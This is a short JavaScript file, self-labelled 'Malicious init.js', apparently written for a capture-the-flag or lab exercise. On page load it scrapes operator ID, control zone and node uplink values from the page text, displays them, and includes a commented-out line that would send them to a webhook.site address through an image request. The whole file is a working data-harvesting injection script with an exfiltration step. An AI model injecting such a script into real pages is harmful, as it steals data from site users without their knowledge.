window.onload = function () {
  alert("✅ Malicious init.js running");

  const operatorInfo = {
    operatorId: null,
    controlZone: null,
    nodeUplink: null
  };

  // Try to extract from known text content if it's structured
  const bodyText = document.body.innerText;

  operatorInfo.operatorId = bodyText.match(/Operator ID[:\s]+([^\n]+)/)?.[1] || "not found";
  operatorInfo.controlZone = bodyText.match(/Control Zone[:\s]+([^\n]+)/)?.[1] || "not found";
  operatorInfo.nodeUplink = bodyText.match(/Node Uplink[:\s]+([^\n]+)/)?.[1] || "not found";

  alert(
    `Extracted:\nOperator ID: ${operatorInfo.operatorId}\nControl Zone: ${operatorInfo.controlZone}\nNode Uplink: ${operatorInfo.nodeUplink}`
  );

  // Optional: send to webhook
  // new Image().src = "https://webhook.site/your-id?op=" + encodeURIComponent(JSON.stringify(operatorInfo));
};
